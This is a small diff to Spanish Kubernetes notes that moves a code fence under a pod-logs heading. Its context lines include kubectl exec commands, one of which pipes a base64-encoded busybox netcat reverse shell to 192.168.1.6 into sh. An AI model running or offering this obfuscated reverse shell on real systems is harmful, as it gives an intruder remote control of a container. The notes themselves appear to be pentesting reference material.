@@ -32,8 +32,8 @@ kubectl exec pod1 -it -- 'sh'
 kubectl exec pod1 -it -- 'id'
 kubectl exec pod1 -it -- /bin/sh -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjEuNiA0NDMgLWUgc2gK | base64 -d | sh"
 ```
-```bash
 ### Logs de un POD
+```bash
 kubectl logs apache
 
 # Para ver los logs en tiempo real, usar la opción -f
